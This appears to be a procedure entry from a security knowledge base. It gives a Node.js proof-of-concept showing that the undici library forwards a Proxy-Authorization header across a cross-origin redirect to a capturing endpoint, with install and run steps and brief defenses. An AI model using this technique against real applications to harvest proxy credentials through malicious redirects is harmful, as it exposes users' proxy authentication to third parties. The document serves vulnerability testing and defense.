---
id: proc-undici-poc-001
name: Create-and-Execute-Undici-PoC-Script
tags:
  - poc
  - scripting
  - undici
  - header-leak
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/node-execute-poc]]'
verified: false
platforms:
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:29:56.633Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-and-Execute-Undici-PoC-Script

## Summary

This procedure creates and runs a Node.js proof-of-concept script using the undici library to demonstrate the persistence of Proxy-Authorization headers during cross-origin redirects, confirming potential leakage of proxy credentials.

## Description

Targeted at Node.js environments using undici for HTTP requests behind authenticated proxies, this procedure simulates a request that triggers a cross-origin redirect. The script sets a Proxy-Authorization header and observes if it is forwarded to an attacker-controlled endpoint after redirection. Prerequisites include installing undici and setting up a local server on port 8182 to capture requests. The attack scenario involves applications inadvertently leaking proxy auth to third parties via malicious redirects.

## Requirements

1. Node.js installed (v14+ recommended).
2. undici library: `npm install undici`.
3. Local HTTP server on port 8182 for capturing requests (e.g., using netcat or a simple Node.js server).
4. Control over a redirecting endpoint (e.g., http://anysite.com/redirect.php?url=http://localhost:8182/vvv).

## Defense

Defensive measures and detection strategies:

- Update to patched undici versions that clear Proxy-Authorization.
- Monitor application logs for unexpected header forwards in redirects.
- Use proxy configurations that avoid sending auth headers unnecessarily.

## Objectives

1. Simulate a cross-origin redirect with proxy auth header.
2. Execute the request to trigger potential leakage.
3. Capture evidence of header persistence on the target endpoint.

## Instructions

### Step 1: Install Dependencies

**Context**: Ensure undici is available in the Node.js project.

Run the installation command:

```bash
npm install undici
```

> This adds undici to node_modules for importing in scripts.

### Step 2: Create the PoC Script

**Context**: Write a script that makes a request with the vulnerable configuration.

Create `poc-undici-leak.js` with the following content:

```javascript
const { request } = require('undici');

(async () => {
  const response = await request('http://anysite.com/redirect.php?url=http://localhost:8182/vvv', {
    headers: { 'Proxy-Authorization': 'xxxxxxxx' },
    maxRedirections: 3
  });
  console.log('Status:', response.statusCode);
  console.log('Headers:', response.headers);
  let body = '';
  for await (const chunk of response.body) {
    body += chunk;
  }
  console.log('Body:', body);
})();
```

> The script uses undici's request with proxy auth and follows redirects.

### Step 3: Execute the Script

**Context**: Run the PoC while listening on the attacker port.

Execute [[commands/node-execute-poc]] to run the script:

```bash
node poc-undici-leak.js
```

> Expected: Script outputs response details; attacker server logs incoming request with Proxy-Authorization.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/node-execute-poc]]

## Tools Used


## Tags

- [[poc]]
- [[Scripting]]
